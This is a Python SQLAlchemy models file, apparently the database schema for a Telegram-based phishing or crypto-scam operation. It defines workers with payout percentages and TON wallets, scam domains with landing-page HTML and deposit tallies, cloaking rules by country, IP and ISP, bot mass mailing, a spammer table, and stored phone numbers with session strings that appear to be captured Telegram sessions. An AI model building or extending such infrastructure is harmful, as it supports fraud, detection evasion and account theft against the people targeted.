from datetime import datetime

from sqlalchemy import Column, Integer, String, Boolean, DateTime, Numeric, ForeignKey, Text, JSON, BIGINT
from sqlalchemy.orm import relationship, Mapped, mapped_column
from .database import Base


class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    tg_id = Column(BIGINT, index=True, unique=True, nullable=False)
    lolz_profile = Column(String(255), nullable=True)  # Указываем длину 255
    nickname_display = Column(String(255), nullable=True)  # Указываем длину 255
    first_name = Column(String(255), nullable=True)
    last_name = Column(String(255), nullable=True)
    username = Column(String(255), nullable=True)
    status = Column(String(255), default="Воркер")  # Указываем длину 255
    percentage = Column(Numeric(5, 2), default=70)
    domains_limit = Column(Integer, default=2)
    bots_limit = Column(Integer, default=3)
    balance = Column(Numeric(10, 2), default=0)
    profits = Column(Numeric(10, 2), default=0)
    registration_date = Column(DateTime, default=datetime.now())
    notifications_enabled = Column(Boolean, default=True)
    ton_wallet = Column(String(255), nullable=True)  # Указываем длину 255

    # (Опционально) Связь с другими таблицами
    # operations = relationship("Operations", back_populates="user")
    made_bots = relationship("Made_Bots", back_populates="user")
    domains = relationship("Domains", back_populates="user")
    subdomains = relationship("SubDomains", back_populates="user")
    spammer = relationship("Spammer", back_populates="user")



class CryptoBot_invoices(Base):
    __tablename__ = "crypto_bot_invoices"
    id = Column(Integer, primary_key=True, index=True)
    invoice_id = Column(Integer)
    amount = Column(Numeric(10, 2))


class Domains(Base):
    __tablename__ = "domains"
    id = Column(Integer, primary_key=True, index=True)
    domain = Column(String(255))
    user_tg_id = Column(BIGINT, ForeignKey("users.tg_id"))  # Foreign key for user_tg_id
    end_date = Column(DateTime)
    type = Column(String(255), default="private")  # Указываем длину 255 (public или private)
    status = Column(String(255), default="Не привязан")
    landing_id = Column(Integer, ForeignKey("landings.id"))
    registration_date = Column(DateTime, default=datetime.now())  # Указываем длину 255
    visits = Column(Integer, default=0)
    deposits_count = Column(Integer, default=0)
    deposit_amount = Column(Numeric(10, 2), default=0)
    manifest_id = Column(Integer, ForeignKey("manifest.id"))
    cloaking_id = Column(Integer, ForeignKey("cloaking.id"))

    manifest = relationship("Manifest", back_populates="domain")  # Relationship for Manifest
    landing = relationship("Landing", back_populates="domains")
    user = relationship("User", back_populates="domains")  # Relationship for User
    subdomains = relationship("SubDomains", back_populates="domain")  # Relationship for Subdomains
    cloaking = relationship("Cloaking", back_populates="domain")  # Relationship for Cloaking


class SubDomains(Base):
    __tablename__ = "subdomains"
    id = Column(Integer, primary_key=True, index=True)
    subdomain = Column(String(255))
    domain_id = Column(Integer, ForeignKey("domains.id"))  # Foreign key for domain_id
    user_tg_id = Column(BIGINT, ForeignKey("users.tg_id"))  # Foreign key for user_tg_id
    end_date = Column(DateTime)

    user = relationship("User", back_populates="subdomains")  # Relationship for User
    domain = relationship("Domains", back_populates="subdomains")  # Relationship for Domain


class Landing(Base):
    __tablename__ = "landings"
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(255))
    landing_html = Column(Text)
    preview = Column(String(255))

    domains = relationship("Domains", back_populates="landing")  # Relationship for Domains


class Manifest(Base):
    __tablename__ = "manifest"
    id = Column(Integer, primary_key=True, index=True)
    title = Column(String(255), nullable=True)
    picture = Column(Text, nullable=True)
    link = Column(Text, nullable=True)

    domain = relationship("Domains", back_populates="manifest")  # Relationship for Domain


class Cloaking(Base):
    __tablename__ = "cloaking"
    id = Column(Integer, primary_key=True, index=True)
    countries = Column(Text, nullable=True)
    ips = Column(Text, nullable=True)
    isp_providers = Column(Text, nullable=True)

    domain = relationship("Domains", back_populates="cloaking")  # Relationship for Domain'


class Made_Bots(Base):
    __tablename__ = "made_bots"
    id = Column(Integer, primary_key=True, index=True)
    bot_id = Column(String(255), nullable=False)
    bot_name = Column(Text, nullable=True)
    bot_token = Column(Text, nullable=False)
    web_app_button = Column(Text, default="Web")
    start_photo = Column(Text, nullable=True)
    web_app_position = Column(Boolean, default=False)
    start_message = Column(Text, nullable=True, default='👋')
    buttons = Column(JSON, nullable=True)
    is_working = Column(Boolean, default=False)
    is_referal = Column(Boolean, default=True)
    process = Column(Text, nullable=True)
    web_app_link = Column(Text, nullable=True)
    web_app_html = Column(Text, nullable=True)
    user_tg_id = Column(BIGINT, ForeignKey("users.tg_id"))

    user = relationship("User", back_populates="made_bots")
    mailing = relationship("Mailing", back_populates="made_bots")  # Relationship for User


class Mailing(Base):
    __tablename__ = "mailing"
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(255), nullable=True)
    mailing_text = Column(Text, nullable=True)
    mailing_buttons = Column(Text, nullable=True)
    interval = Column(Integer, nullable=True)
    is_mailing = Column(Boolean, default=False)
    bot_id = Column(Integer, ForeignKey("made_bots.id"))

    made_bots = relationship("Made_Bots", back_populates="mailing")   # Relationship for Made_Bots


class Spammer(Base):
    __tablename__ = "spammer"
    id = Column(Integer, primary_key=True, index=True)
    user_tg_id = Column(BIGINT, ForeignKey("users.tg_id"))  # Foreign key for user_tg_id
    message_delay = Column(Integer, default=5)
    cycle_delay = Column(Integer, default=60)
    message_text = Column(Text, nullable=True)
    message_photo = Column(Text, nullable=True)

    user = relationship("User", back_populates="spammer")


class SessionData(Base):
    __tablename__ = 'sessions'

    id = Column(Integer, primary_key=True, autoincrement=True)
    phone = Column(Text)
    session_string = Column(Text)